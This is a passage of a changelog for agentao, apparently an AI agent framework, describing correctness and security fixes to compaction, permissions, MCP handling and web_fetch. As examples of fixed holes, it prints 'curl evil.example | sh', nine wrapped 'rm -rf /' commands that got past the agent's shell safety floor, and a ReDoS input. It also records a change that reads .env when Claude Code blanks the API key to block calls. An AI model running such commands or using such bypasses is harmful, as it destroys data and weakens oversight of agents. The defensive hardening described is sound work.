  transport class; an embedded host reading `agent.last_turn` had no way to
  tell the two apart. Surfaced by a GAIA Level 1 run where every capped task
  scored as answered. `INCOMPLETE_MAX_ITERATIONS` joins the vocabulary and
  `_handle_iteration_cap` now passes it. The transport flag stays for the
  case it uniquely reports — the cap was hit but a Stop hook continued past
  it — and `agentao run` is unaffected, since `_classify_outcome` checks the
  flag before the `incomplete_reason` branch, so exit 4 still wins.

  **This supersedes a statement in the 0.4.19 notes**, which described
  `finish_reason_missing` as riding its own axis "the way `max_iterations`
  does". `max_iterations` no longer does: it is now a member of
  `INCOMPLETE_ANSWER_REASONS`. `finish_reason_missing` is unchanged and still
  rides its own axis.

- **Compaction could silently do nothing, forever, and announce passes it
  never ran.** Three defects, all in the automatic path:

  `compress_messages` advanced the split point to the next `user` message, so
  a tail with no user message — routine, since 20 consecutive assistant/tool
  messages is about ten tool calls in one turn — found no split and returned
  history unchanged on every iteration. The only unsafe split is one landing
  *on* a `role: "tool"` message, because tool results are appended contiguously
  after the assistant message that requested them; `_find_split_index` now
  takes any non-tool boundary and merely *prefers* a user one. A genuine
  structural failure now counts toward the circuit breaker instead of spinning.

  Both compaction steps announced work they were not going to do. With the
  breaker open `compress_messages` returned immediately, but the `PreCompact`
  dispatch sat *before* it — so every iteration forked a hook subprocess and
  emitted a `CONTEXT_COMPRESSED` reporting `pre == post`. Microcompaction had
  the same shape, gating on "am I in the band" and never on "is anything left
  to truncate"; `microcompact_would_mutate()` now shares
  `_microcompactable_indices()` with the transform so the two cannot drift.

  And the token anchor was dropped on *every* microcompact pass, mutation or
  not, forcing a full re-encode of the whole history each iteration in the
  band. Now conditional on whether the pass actually shortened something.

  Accepted consequence, stated plainly: relaxing the split means
  post-compaction history can open on an `assistant` turn. Not a new break —
  the overflow fallback (`messages[-2:]`) never guaranteed a user-first
  history either.

- **The summarization prompt demanded verbatim text the input pipeline had
  already deleted.** `_SUMMARIZE_SYSTEM_PROMPT` asks for error messages
  "verbatim" and calls Files and Errors the most important sections, while
  `_format_for_summary` clipped every tool result to 200 characters and every
  message to 500 first. Measured over 167 real tool results (239 KB): 75%
  truncated, 12% of content surviving.

  The same measurement retired the `_HIGH_FIDELITY_TOOLS` carve-out —
  `write_file` and `replace` return confirmation strings bounded by a path
  length (measured median 114 characters), so their 1000-character budget was
  structurally unreachable, and the content it meant to preserve lives in the
  call arguments, which are now rendered. Tiering keys on **content** instead:
  a result carrying a failure gets `_ERROR_RESULT_TRUNCATION` (4,000 chars,
  head *and* tail, because a failing command's diagnostic is at the end), a
  plain result `_TOOL_RESULT_TRUNCATION` (1,000), a message
  `_MESSAGE_TRUNCATION` (2,000). The failure markers are anchored on
  diagnostic shapes rather than bare words — a bare-word scan matched 169 of
  272 source files, the anchored one matches 9, with every real diagnostic
  still caught.

  Paired with a **total** ceiling on the assembled transcript
  (`_SUMMARY_INPUT_BUDGET_RATIO`, 10% of the effective window, floor 2,000
  tokens), spent newest-first and counted in tokens so it shares units with
  the window it is a fraction of. Raising per-entry caps without a ceiling
  would trade one defect for another: nothing bounded the transcript before,
  and a summarization call that overflows increments the circuit breaker.
  Ordinary windows go from about 15% retention to 46–76%.

- **Truncation was not a fixed point, so the same text was cut twice and the
  omission count lied.** `_head_tail_clip` appended its notice *outside* the
  limit, making its output `limit + len(notice)` characters — strictly longer
  than the limit that produced it. Everything downstream asks "is this over
  the limit?", so the clip re-selected its own output forever: pass 2 cut the
  honest `[… 197,020 chars omitted …]` notice out of the middle and wrote
  `45` in its place, and every later pass reported `40`. The summarizer —
  whose output *permanently* replaces history — was told a result had lost 40
  characters when it had lost 197,020.

  The knock-on was larger than the misreport: a microcompacted result stayed
  over `MICROCOMPACT_TOOL_LIMIT` forever, so `microcompact_would_mutate()`
  never returned False, which made both stand-downs above inert in the common
  case. The notice is now budgeted *inside* the limit, a re-clip carries prior
  counts forward, and `compress_messages` no longer microcompacts the half it
  is about to discard.

- **A one-word typo in a permission rule was a silent privilege escalation.**
  The engine reads exactly four keys off a rule and checked the type of none of
  them, so an unrecognised key was ignored in silence — and since the ignored
  key was usually the rule's *condition*, the rule widened to the whole tool.
  `{"tool": "run_shell_command", "pattern": "^git ", "action": "allow"}` —
  `pattern` should be `args` — allowed `curl evil.example | sh` where the correct
  rule asks, and `/permissions` rendered it as an ordinary `[✓ ALLOW]`. Seven
  type failures went with it: six raised `AttributeError`/`TypeError` out of
  `decide_detail()` **mid-turn** at the first tool call (`tool_planning.py` has
  no `try`/`except` there), and the seventh — `domain.allowlist` written as a
  string instead of a list — silently downgraded a `deny` to *ask* with no error
  anywhere. All eight are now construction-time errors.

- **`UnicodeDecodeError` subclasses `ValueError`, so no config reader caught
  it.** Ten read sites across `permissions.json`, `settings.json`, `mcp.json`,
  `acp.json` and `skills_config.json` caught `(OSError, json.JSONDecodeError)`
  and nothing else, so a file that was not valid UTF-8 raised straight through
  the `except` clause written to contain it. A UTF-16LE `settings.json` — what
  PowerShell 5.1's `>` and `Out-File` write on stock Windows — killed
  interactive startup from `AgentaoCLI.__init__`, before the factory ran; a
  UTF-16LE `permissions.json` crashed `PermissionEngine.__init__` on all five
  session-construction paths, including ACP `session/new` and sub-agent spawn;
  and a UTF-16LE `acp.json` bypassed `AcpConfigError` to surface as a raw
  traceback. This is the missed sibling of a P0 fixed one line lower in
  `permission-hardening-plan.md`: `isinstance(data, dict)` guards the *parsed*
  shape, but the *decode* failure happens earlier, on `read_text`. All ten sites
  now read `utf-8-sig` (so a BOM'd file loads instead of being discarded — reads
  only; that codec **writes** a BOM) and catch `UnicodeDecodeError` explicitly.
  `agentao doctor` — the one tool a user reaches for *because* their config is
  broken — had the same hole.

- **Config readers that swallowed a broken file now say so.** `settings.json`,
  `mcp.json` and `skills_config.json` returned an empty default for an
  unreadable, mis-encoded, malformed, or non-object file without a word. A
  missing file is still silent; everything else warns with the path. Caveat
  worth knowing: those warnings go to the `agentao` logger, which reaches the
  terminal only before a handler is attached — in practice the `settings.json`
  reads are visible and the `mcp.json` / `skills_config.json` ones land in
  `agentao.log`. `agentao doctor` surfaces all of them. Giving library-module
  warnings a console handler is a separate decision, deliberately not made here. The *shape* guard travels with it:
  a top-level JSON list in `settings.json` / `mcp.json` / `skills_config.json`
  used to reach `.get(...)` and raise `AttributeError` out of CLI startup,
  MCP config loading and `SkillManager.__init__`; it is now the same
  warn-and-default. `plugins_config.json` got the `UnicodeDecodeError` clause
  its sibling reader in the same module already had.

- **An invalid `permissions:` block in a run spec was reported as a runtime
  error, after the runtime had already been built.** `RunPermissionRule.args` is
  `Dict[str, Any]`, so pydantic accepts `args: {command: 1}` and the permission
  validator is the first thing to reject it — a *spec* error. It was checked
  after `build_from_environment()`, so any unrelated construction failure (a
  missing API key, an unusable user permissions file) reported first and turned
  exit 2 into exit 1; and on the success path the whole agent plus its on-disk
  side effects were created before the invalid input was rejected. Now validated
  beside the other spec checks, before any runtime exists.

- **Error text could crash the code that displays it.** Permission validation
  quotes the offending key verbatim, so a rule field literally named `[/oops]` —
  or an `OSError` stringifying as `[Errno 13] ...`, or a repo under `~/[wip]/` —
  reached Rich as markup. The interactive `Fatal error:` handler and
  `agentao doctor`'s renderer both interpolated it unescaped, raising
  `MarkupError` in place of the typed startup error or the finished report.
  Every dynamic value at both boundaries is now escaped.

- **A PreToolUse hook's deny reason never reached the model.** The reason was
  parsed, prefixed, and delivered to the *host* on
  `PermissionDecisionEvent.reason` — but the tool result handed back to the LLM
  was the bare `Tool execution blocked by a PreToolUse hook: '<tool>'.`, with no
  explanation and, unlike the engine-deny and user-cancel branches, no
  instruction about what to do next. A hook denying with "npm is banned here,
  use pnpm" left the model unable to distinguish a blanket ban from a redirect:
  it either abandoned the task or re-issued the call with varied arguments,
  which slips past the doom-loop counter (that keys on identical
  `(name, args_raw)` and cuts off at three) and burns iterations. The reason now
  rides the deny result, whitespace-flattened, surrogate-repaired and clipped to
  500 characters — a hook's stdout is unbounded, and the next bound downstream
  is not a truncation but a spill to `.agentao/tool-outputs/`.

  The hook branch gets its own close — `Do not re-issue this call unchanged; if
  the hook's reason below names an alternative, follow it.` — rather than the
  blanket one the other deny paths share, whose "do not … or use a different
  tool" negates distributively and would forbid the very alternative a redirect
  reason recommends. The instruction is placed *before* the reason so it
  survives the tool-result cut that builds a compaction summary — 1,000
  characters for a plain result since the tiering fix below, 200 when this
  landed.

---

## [0.4.19] — 2026-08-04

A **correctness release**. Nothing in it is a new capability anyone asked for;
every user-facing item is a defect that failed *silently* — a key that was read
as empty, tools that were never listed, a command that walked past the security
floor, a stream that ended mid-answer and reported success.

The three worth upgrading for:

- **agentao launched from a Claude Code session could not find its API key.**
  A present-but-empty ambient variable permanently masked the real value in
  `.env`. It has shipped since 0.4.8, when the wrapper was added.
- **The shell hardline floor was bypassable with a run modifier.**
  `timeout 5 rm -rf /` and eight sibling shapes passed a floor that sits above
  every mode preset and user rule. The same grammar was exponentially
  backtrackable on the tool-execution hot path.
- **MCP tools past page 1 were invisible.** A server paginating a 400-tool
  catalog presented whatever fit on page 1, with no error, no warning, and
  nothing in `/mcp list` saying so.

### Added

- **agentao negotiates the MCP protocol era instead of pinning the handshake.**
  mcp 2.0 added a second protocol era, and the legacy `initialize` handshake can
  only ever report the version the *client* proposed or older — so a modern-only
  server (2026-07-28+) was unreachable by construction and failed the connect
  outright with `-32022`. `McpClient._negotiate()` now sends `initialize` and
  escalates to `server/discover` only when the server *rejects* it: definitely
  (`-32022`, which names the server's own `supportedVersions`) or speculatively
  (`-32601`, since the modern era has no `initialize` handler at all — a failed
  speculative probe re-raises the original error rather than renaming the
  failure after a method the operator never heard of).

  Handshake-first is deliberately the reverse of upstream's `mode='auto'`, and
  the order was decided by measurement rather than preference. Probe-first was
  built and then run against a real server per SDK generation over stdio: an
  mcp 2.0.0 `MCPServer` negotiated silently, but an mcp 1.26.0 `FastMCP`
  rejected the unknown method with a 31-error pydantic union-validation dump —
  **258 lines**, and for stdio that stderr *is* agentao's stderr. That is a
  per-connect cost on the commonest server there is, paid for a capability with
  no consumer today: tool discovery and tool calls behave identically in both
  eras, verified against the 2.0.0 peer rather than assumed. The tradeoff is
  that a dual-era server stays on the handshake era;
  `test_a_dual_era_server_is_left_on_the_handshake_era` pins it, so the day a
  modern-only capability is needed the flip is one deliberate edit in
  `_negotiate`.

  The negotiated version lands on `McpClient.protocol_version`,
  `get_server_status()["protocol"]` and `/mcp list`. It is a **ceiling, not a
  constant** — gate on `>=`, never equality. An unresolvable mismatch raises
  `McpProtocolEraError`, carrying both halves of the failure; its type
  suppresses the "try `type: sse`" hint, which no transport change could act on.

  Six defects found while reviewing that change ship with it: `_compat.field()`
  now dispatches on a model's *declared* fields instead of `hasattr` (every wire
  model is `extra='allow'` on both majors, so a server shipping its own
  `protocol_version` / `is_error` key made the old probe resolve to the peer's
  unvalidated value over the SDK-validated camelCase field — this affected every
  `field()` call site); `/mcp list` escapes server-authored strings (an unmatched
  `[/b]` in a third-party error message raised `MarkupError` out of the command
  and took the whole listing with it, healthy servers included); `call_tool`
  checks that a reconnect actually succeeded, instead of handing the model
  `'NoneType' object has no attribute 'call_tool'` in place of the reason;
  `connect()` clears `_session` and `_protocol_version` on its failure path, so
  a version can no longer hang off an ERROR server; `_can_discover()` probes the
  live session rather than the imported class; and `call_tool` opts in to
  `InputRequiredResult`, so an SDK `RuntimeError` telling a *programmer* to pass
  `allow_input_required=True` no longer arrives as the tool's result.

  Design: `docs/design/mcp-streamable-http.md` §5.8/§5.8.1 (EN + zh).

- **`TurnOutcome.finish_reason_missing` — agentao now reports when a provider
  never said why generation stopped.** A stream can end with no `finish_reason`
  at all: a gateway closing the SSE body after its own upstream timeout, or a
  partially-compatible local server that never emits the field.
  `_StreamAccumulator` falls back to `"stop"`, so such a turn was
  indistinguishable from a clean completion — a truncated fragment came back as
  a finished answer with `is_answer` True.

  **Reported, not classified.** The flag is deliberately *not* a member of
  `INCOMPLETE_ANSWER_REASONS` and deliberately does not affect `is_answer`:
  every value in that closed set becomes a CLI error envelope, so joining it
  would make each turn a hard failure on every provider that omits the field.
  It rides its own axis, the way `max_iterations` does. A host that wants the
  strict reading writes `o.is_answer and not o.finish_reason_missing`; one on a
  known-lenient provider keeps ignoring it. The wire value of `finish_reason`
  itself keeps its `"stop"` fallback — flipping that to `None` would shift
  LLM_CALL_COMPLETED payloads and replay renders for every provider that omits
  it.

  Sticky across every LLM call in the turn, not only the last: an intermediate
  call that ends without a finish_reason may have had its tool-call arguments
  cut off with nothing to detect it, since `_is_length_truncation` never fires
  and the arguments get executed. The compaction summarizer bypasses the chat
  loop entirely and so records its own observation, which the two compaction
  call sites fold in — that is the one call whose output permanently rewrites
  history, and a truncated summary is inherited by every later turn. Suppressed
  on a cancelled turn, where the cancellation already explains the absence;
  reported on an errored one, where it does not.

  It reaches every surface that exists to explain a turn after the fact:
  `agentao.log` qualifies its `Finish Reason:` line, LLM_CALL_COMPLETED carries
  `finish_reason_reported`, the replay `turn_completed` record carries the flag
  when set, and `agentao run`'s JSON envelope gains `finish_reason_missing`
  without it touching the exit code.

### Changed

- **CI gains a narrow ruff gate — defect rules only, and it is a required
  check.** `ruff check .` selecting `E9`, `F401`, `F402`, `F405`, `F811`,
  `F821` and nothing else. The selection is measured, not chosen by taste:
  against the tree it landed on, `UP` fired 2652 findings and `F401` 255, with
  zero live bugs between them, while the defect group fired 4 — each read
  individually, none live. So the claim for this gate is deliberately not "it
  found bugs"; it is that F821 has already bitten this repo (#141 is titled
  "declare plugin types for F821"), it measures 0 today, and ~15s of CI keeps
  it there.

  `F401` is enforced in `tests/` and `examples/` — 184 findings cleaned across
  92 files — and exempted **wholesale** for `agentao/`. That exemption is not
  squeamishness: agentao is a published library, so a name re-exported for
  downstream embedders is imported by nobody in this repo, which is exactly
  what a public API looks like to a single-file linter. `--fix` over the tree
  applied 212 fixes and broke 9 test modules at collection, deleting the public
  surface of `llm/client.py`, `acp_client/client.py` and the `__init__.py`
  re-export hubs. Making `agentao/` decidable later means giving every
  re-export hub an explicit `__all__`. Suppress with a reason
  (`# noqa: F401 — pytest fixture injection`), never bare. See
  `docs/design/lint-gate.md`.

- **Five pre-pytest test scripts removed, and duplicated test helpers hoisted
  into `tests/support/`.** Nothing in the published package changes; two of the
  removals had measured side effects on every default `pytest tests/` run.
  Three of the five defined no `def test_*` at all — they were module-level
  scripts that ran during *collection* and printed, with every failure path a
  `print("✗ ...")` rather than a raise, so none could report a problem even in
  principle. One of those wrote `OPENAI_API_KEY` and `OPENAI_BASE_URL` into
  `os.environ` at collection time, outside monkeypatch and so unrollbackable,
  which left all 3806 other tests inheriting `https://api.example.com/v1` as
  their base URL, decided by collection order. Another called `agent.chat()`
  for real on every run — taking a 401 and passing anyway, or sending a
  developer's genuine exported key to api.openai.com — and constructed
  `Agentao(working_directory=Path.cwd())`, mutating the developer's own
  `.agentao/memory.db`.

- **Docs**: the pi-mono v0.80.6→v0.83.0 pull review is recorded
  (`docs/design/pi-mono-pull-review-2026-08.md`), the `flint-chart-author` skill
  joins the `examples/skills/` gallery (prose only — no install, no script, no
  API key), and three places that said skill `references/*.md` are "loaded on
  activation" are corrected: `activate_skill` *enumerates* them by absolute path
  and tells the model to `read_file` what it needs, which is the whole point —
  the always-resident cost stays at name + description.

### Fixed

- **An empty ambient env var no longer permanently masks the real value in
  `.env`.** `safe_load_dotenv` assigned via `os.environ.setdefault`, so a key
  that was *present but empty* counted as set: no-override declined to write,
  and every downstream `os.getenv` saw `""` forever. This is not hypothetical
  — Claude Code injects `ANTHROPIC_API_KEY=""` into child processes to neuter
  their LLM calls, so **any agentao invoked from a Claude Code session failed
  with "no API key" while a valid key sat unread in `.env`**. Present-but-empty
  (or whitespace-only) is now treated as absent; a non-empty ambient value
  still wins, which is the part of no-override callers actually rely on. NUL
  scrubbing — the reason this wrapper exists — is unchanged and now covered by
  a test. See `tests/test_env_dotenv.py`.

- **MCP `tools/list` is paginated instead of silently dropping page 2 and
  beyond.** `McpClient` issued exactly one `list_tools()` and took `.tools`, so
  every tool a paginating server exposed past the first page was invisible to
  the model — with no error, no warning, and nothing in `/mcp list` or
  `get_server_status()` distinguishing "this server has 12 tools" from "this
  server has 12 of its 400". `grep next_cursor` returned zero matches
  repo-wide, tests included.

  `_list_all_tools()` now walks the cursor, bounded against a hostile peer:
  repeated cursor, 64 KiB cursor (UTF-8 bytes), 1024 accumulated tools (checked
  *before* `extend`), and 100 pages. Every bound raises `McpCatalogError`,
  which `connect()` absorbs into `status=ERROR` for that one server —
  truncation is deliberately not a supported outcome, since a partial catalog
  is the same silent wrongness this removes. `McpCatalogError` is its own type
  so it can be excluded from the "try `type: sse`" hint: a bound is reachable
  only after `initialize` and one `tools/list` have already succeeded, so the
  transport provably works and pointing the operator at it would hide the real
  cause.

  Cross-major: `params=` is the one call spelling accepted on all three CI SDK
  cells including the 1.26.0 floor (positional `cursor=` is 1.x-only, gone in
  2.x), and the cursor field needs `_compat.field` (`nextCursor` →
  `next_cursor`). Note there is **no page-size field in the MCP spec** — the
  server decides. Design, including three regression profiles accepted and
  recorded rather than fixed: `docs/design/mcp-tool-list-pagination.md` §9.

- **`replace` folds Unicode compatibility forms (NFKC) before fuzzy matching.**
  The tier-3 match normalized through a codepoint table only (dashes, quotes,
  spaces), and that table has no entries for compatibility forms — so an edit
  whose `old_text` differed from the file only by full-width punctuation fell
  straight through to `_not_found_hint`. In a CJK source file mixing 全角 and
  半角 that is the common case, not an exotic one: `print（"你好"）；` was
  unreachable from `print("你好");`.

  Tier 3 now runs NFKC first, then the table. Neither pass subsumes the other —
  NFKC folds full-width forms, ligatures and every space variant but leaves
  smart quotes and en/em dashes alone (they have no compatibility
  decomposition), which is exactly what the table covers. The order is
  load-bearing: sweeping the Unicode planes finds five characters that NFKC
  folds *into* a table entry without being in the table themselves (U+207B,
  U+208B, U+FE31, U+FE32, U+FE58), and table-first strands all five one step
  short of ASCII. Byte offsets are unaffected — `line_transform` only builds
  the per-line comparison keys, while the prefix table is built from the
  original line lengths, so spliced spans still index the original content.

- **Event-listener exceptions are logged instead of swallowed in silence.**
  `EventBroadcaster.notify` caught every subscriber exception with a bare
  `except Exception: pass`. Swallowing is correct and stays — a subscriber is a
  side channel and must never break the emit path — but being *silent* about it
  is not: the only symptom an embedded host got was "my listener does nothing",
  with no record anywhere and the swallow three call frames from any code they
  wrote. WARNING-and-swallow was already the documented convention for the
  other side-channel sink on this contract (`HostReplaySink`); `broadcast.py`
  was the one place that did not follow it.

  Logged, not re-emitted as an error event: an event would re-enter `notify`,
  so a listener that raises on everything would spin forever. `event.type`
  only, never `event.data` — payloads carry tool arguments, full tool results
  and LLM text, and agentao's credential redaction is a `Formatter` on its own
  file handler (deliberately not a `Filter`, so it does not leak into a host's
  handlers), which means a payload logged here would reach those handlers
  unredacted. With `exc_info=True`, since a swallowed exception with no stack
  is barely better than silence.

- **Renaming a skill preserves its `SKILL.md` layout byte-for-byte.**
  `replace_skill_name` rewrites a file the user wrote, so everything except the
  `name:` value must survive. It rebuilt the frontmatter from a literal
  `f"---\n{block}\n---\n"` instead, reformatting every document whose layout
  differed from that one shape — 6 of 7 measured layouts were corrupted,
  including the one every skill in this repo uses (the blank line between the
  closing fence and the body, silently deleted by `/crystallize`). Also
  affected: a file ending at the fence gained a trailing newline, leading
  whitespace was dropped, trailing spaces on the fence line were dropped, CRLF
  documents were rewritten to LF, and a blank line inside the frontmatter was
  deleted.

  The fix splices the new block into the original string by the frontmatter's
  own span, so no character outside that block is retyped, and within the block
  replaces only the *value* span of the `name:` line — replacing the whole match
  takes the trailing whitespace with it, because `_NAME_LINE_RE` ends in `\s*$`
  and `\s` swallows a trailing `\r`. +16 tests, all comparing whole strings; the
  pre-existing test passed against the buggy version precisely because a
  substring assertion cannot see a deleted blank line.

### Security

- **The shell hardline floor no longer lets a run modifier walk past it.**
  `permissions.py` documents that `full-access` may omit its sensitive-file
  rule because "disk-wipe-class attacks already trip the hardline floor". The
  floor did not uphold that — a run modifier in front of the command was enough:

      timeout 5 rm -rf /        nice -n 5 rm -rf /
      stdbuf -oL rm -rf /       chrt 10 rm -rf /
      taskset ff rm -rf /       /usr/bin/timeout 5 rm -rf /
      exec -a login rm -rf /    nice --adj 5 rm -rf /
      timeout .5 rm -rf /

  Root cause: the wrapper prefix carried one value-flag set copied from
  `sudo`/`env`, and had no notion of a wrapper that consumes a positional
  operand; `timeout` and `stdbuf` were absent entirely. A shared set cannot
  work — `sudo -n` takes no value while `nice -n 5` does, so any single set
  breaks one of them. Each family now carries its own set, and
  `timeout`/`chrt`/`taskset` declare their bare operand.

- **The wrapper grammar is no longer exponentially backtrackable.** It ran on
  the tool-execution hot path, for every shell call. Two ambiguities, both
  fixed by making the arms disjoint rather than by bounding input: a separated
  flag value could also start a fresh wrapper (`sudo -u sudo ...`), so wrapper
  words are excluded from the value arm; and a bare `-n` matched both the
  short-flag and the general-flag arm. `"sudo " + "-u sudo "*16 + "X"` — 134
  characters — took **35 minutes** through `hardline_check`; it now takes
  0.80 ms, and every ambiguous shape scales linearly to n=128. The ReDoS
  predates the wrapper additions above (`sudo` was already exponential), so
  this fixes it rather than merely avoiding widening it.

- **Two false-positive directions closed with it.**
  `shutdown`/`reboot`/`halt`/`poweroff` matched on `\b`, which also fires
  before `-` and `.`, so promoting a wrapper operand to command position made
  `timeout 60 reboot-check.sh` read as `reboot`. Because the floor sits above
  mode presets and user rules, no `permissions.json` allow and no
  `/mode full-access` could unblock it. Verified against a 56-command
  must-block corpus (0 false negatives) and a 14-command must-allow corpus
  (0 false positives); the new tests fail 4/4 against the previous grammar.
  Still not recognised as wrappers, all pre-existing: `flock`, `setarch`,
  `doas`, `unshare`, `runuser` — expanding that inventory is a separate call
  with its own false-positive cost.

## [0.4.18] — 2026-07-30

A **`web_fetch` release**, in two parts that had to ship together.

The local JS-rendering fallback is rebuilt on Playwright directly, replacing
crawl4ai — and the rebuild is mostly a security story, because the retired
implementation had shipped since 0.4.7 with **zero** test coverage. Then
`web_fetch` becomes agentao's first built-in `AsyncToolBase`, so driving
Playwright's async API no longer requires blocking an async host's event loop.

**Breaking:** the `[crawl4ai]` extra is replaced by `[playwright]`, `web_fetch`
changes base class, and `Agentao.arun` no longer uses the event loop's default
executor. Each is detailed below.

### Added

- **`[playwright]` extra** — the local headless-browser fallback for
  `web_fetch`, now driving Playwright directly. Pulls `[web]` because the
  fallback reuses the same BeautifulSoup extraction as the primary path.
  Still requires `playwright install chromium` on top of the pip install; a
  missing browser binary surfaces at render time (Playwright reports it at
  launch, not at import) and is returned as a normal tool error.

- **Tests for the `web_fetch` local-render fallback**
  (`tests/test_web_fetch_playwright_fallback.py`). Its crawl4ai predecessor
  shipped from 0.4.7 to 0.4.17 with **zero** coverage — the only reference to
  it under `tests/` was a `monkeypatch.delenv` clearing its env var. Covers
  selection, dispatch, both setup failures, the retired-value alias, the
  nested-event-loop path, and the SSRF invariant that a blocked target never
  reaches Chromium. One test introspects the **real** installed Playwright
  signatures rather than a fake, and CI's test job installs the extra so it
  cannot silently `importorskip` into retirement.

- **Tests for `web_fetch`'s async surface**
  (`tests/test_web_fetch_async_tool.py`), plus an async section in
  `tests/test_url_policy.py`. The load-bearing ones measure rather than assert
  intent: a 10ms ticker task alongside the fetch proves the caller's loop keeps
  running, and the render is checked to observe the *caller's* thread and loop
  rather than a nested pair. The sync wrapper's counterpart assertion is
  `ticks == 0` — keeping the wrapper's cost documented, and keeping the async
  half honest about what it measures. Both fail if the previous bridge is put
  back.

### Changed

- **BREAKING: `web_fetch` is now an `AsyncToolBase`, so it no longer blocks an
  async host's event loop.** The tool's implementation moved from `execute` to
  `async_execute`; `execute` stays as a synchronous wrapper for embedders that
  are not async.

  What breaks is the *type*, not the call: `web_fetch` is no longer an instance
  of `Tool`, so host code that narrows the registry with `isinstance(t, Tool)`
  — or annotates against it — now silently skips this tool and must widen to
  `RegistrableTool`. Calling `WebFetchTool().execute(...)` from ordinary
  synchronous code is unaffected.

  It had to drive an event loop of its own to reach Playwright's async API, and
  from inside a caller's running loop there is no way to do that without
  blocking it — a synchronous function cannot yield, so the helper submitted the
  coroutine to a worker thread and waited on `Future.result()` **on the loop
  thread**. For that duration nothing else on the host's loop ran and a
  `CancelledError` could not be delivered. Awaiting `async_execute` removes the
  bridge rather than improving it, and the runtime's existing `AsyncToolBase`
  dispatch gains token-driven cancellation on this tool for free.

  Every other blocking call on the same path went with it, since fixing only
  the fallback would have moved the ceiling without changing its nature: the
  HTTP fetch uses `httpx.AsyncClient` (via the new `guarded_get_async`), the
  SSRF policy's `socket.getaddrinfo` runs on a bounded off-loop thread, and the
  HTML decode / parse / text-extraction runs on a worker thread. That last one
  matters more than it looks: on a 2.2MB DOM (~0.7s in `html.parser`) a 10ms
  heartbeat task ticks **0** times with the parse inline and ~31 with it on a
  thread — CPython hands the GIL over every `sys.getswitchinterval()` between
  bytecodes, so a worker shares the CPU with the loop rather than locking it
  out. It is also what the sync tool got for free by being dispatched on an
  executor thread, so leaving it inline would have made this port a regression
  on its own headline axis.

  That HTML work runs on a **dedicated thread pool**, not the loop's default
  executor, and a not-yet-started parse job is cancelled outright rather than
  drained (draining a queued job would hold its response alive and then run work
  nobody wants — defeating the bound the pool is for).

  A cancelled fetch waits (bounded) for its in-flight parse before letting the
  cancellation surface. A *running* job cannot be cancelled — nothing can
  interrupt a Python call from outside it — so returning straight away would
  leave a multi-megabyte DOM parse burning CPU with nobody waiting on the result,
  and a host that cancels repeatedly could stack several up. The canceller pays
  latency it was going to pay regardless. Both this budget and the browser/driver
  teardown budgets now sit inside the AsyncTool dispatcher's cleanup-ack window,
  since cleaning up for longer than the dispatcher will wait produces the very
  detached work they exist to prevent, only with the invocation already reported
  complete. (A *non-cancelled* browser close keeps its generous budget: nothing
  is waiting on a deadline there, and a slow-but-working close should not be
  turned into a killed driver.)

- **BREAKING: `Agentao.arun` no longer runs `chat()` on the event loop's default
  executor.** It uses a dedicated pool with the same capacity asyncio would have
  given, so concurrency is unchanged — but a host that called
  `loop.set_default_executor(...)` to size or instrument agentao's thread usage
  no longer controls this path.

  A turn holds its worker for the whole turn, and partway through it blocks
  waiting on a tool coroutine running on the host loop. Once concurrent turns
  reach the pool's worker count, anything on that loop needing a
  default-executor worker can never get one — and the turns are waiting on
  exactly that work. That includes code agentao does not control:
  `loop.getaddrinfo` submits to the default executor, and **every**
  `httpx.AsyncClient` connect to a hostname resolves through it, so an async tool
  doing an ordinary HTTPS fetch would hang with no way to redirect the lookup
  from agentao's side. Hosts that called `loop.set_default_executor(...)`
  expecting to size agentao's thread usage no longer control this path.

  Hosts that call `WebFetchTool().execute(...)` from ordinary synchronous code
  are unaffected. Hosts already on a loop should switch to
  `await tool.async_execute(...)`; the sync wrapper still works there, and
  still blocks, which is now asserted by a test rather than left implied.

  `web_search` is deliberately unchanged: it never drove its own loop, and it
  blocks in exactly the way every other synchronous built-in does. Making it
  async is a separate question about the tool base class in general, not about
  this defect.

- **`url_policy` grows an async surface paired with the sync one** —
  `validate_outbound_url_async` and `guarded_get_async`, both exported from
  `agentao.security`. The async validator delegates to the sync one on a
  bounded daemon thread rather than reimplementing the checks against an async
  resolver: the policy is security-critical and two copies would drift. The
  redirect-hop predicate is likewise shared (`_redirect_target`), so the two
  `guarded_get` forms cannot disagree about what counts as a hop — the property
  per-hop re-validation rests on. Every async failure mode, including a lookup
  that stalls past its budget or is refused by the process-wide thread cap,
  raises `UrlPolicyError`, so callers need one `except` clause to stay closed.

  Side effect worth naming: name resolution on the `web_fetch` primary path is
  now **bounded** (30s per hop, matching the request timeout). It previously
  inherited `getaddrinfo`'s effectively unbounded behavior, which was tolerable
  only because it blocked its own thread.

  A latent bug in the resolver-thread accounting went with it: the process-wide
  cap reserves a slot before starting the thread, and only the thread's own
  `finally` releases it — so a `Thread.start()` that failed (at the OS thread
  limit, say) burned a slot permanently. Enough failures and every later policy
  check is refused for the life of the process, long after the pressure cleared.

- **BREAKING: the `[crawl4ai]` extra is replaced by `[playwright]`, and
  `AGENTAO_WEB_FETCH_FALLBACK=crawl4ai` is renamed to `=playwright`.**

  agentao only ever used ~9 lines of crawl4ai as a "render page → markdown"
  wrapper, and paid 51 transitive packages for it — 48% of the entire `[full]`
  closure — including two browser-automation stacks (playwright *and*
  patchright), a computational-geometry stack (numpy/scipy/shapely/trimesh/
  rtree/networkx/alphashape), an NLP stack (nltk/tokenizers/huggingface-hub),
  and an LLM client. crawl4ai 0.9.2 additionally swapped its `litellm`
  dependency for `unclecode-litellm`, a fork published by crawl4ai's own
  author. The behavior agentao wanted — render locally, never proxy through a
  third party — is unchanged; only the engine underneath it is.

  `[full]` goes from **107 packages to 59**.

  **Migration:** `pip install 'agentao[playwright]'` (or `[full]`) and
  `playwright install chromium`, then set
  `AGENTAO_WEB_FETCH_FALLBACK=playwright`. The old value still works — it maps
  to `playwright` and logs a warning naming the substitution — but
  `pip install 'agentao[crawl4ai]'` no longer resolves. Nothing changes for
  the default (`none`) or for `jina`.

  The value is kept honest rather than silently reinterpreted: running a
  different engine than the operator configured, without saying so, is the
  same class of behavior as the silent third-party proxy that 0.4.7 removed.

  **One capability is genuinely lost.** The old call passed crawl4ai's
  `enable_stealth=True`, which applied `playwright-stealth` patches to evade
  basic headless detection (`navigator.webdriver` and friends). The
  replacement launches a stock headless Chromium, so sites that fingerprint
  for automation may now serve a challenge page where they previously did
  not. Restoring parity is a one-package addition to the extra
  (`playwright-stealth`) if that turns out to matter in practice; it is left
  out for now rather than carried on the assumption that someone needs it.

### Fixed

- **`web_fetch`'s fallback no longer masks errors raised by the renderer.**
  `_run_async` was `try: asyncio.run(coro) / except RuntimeError:
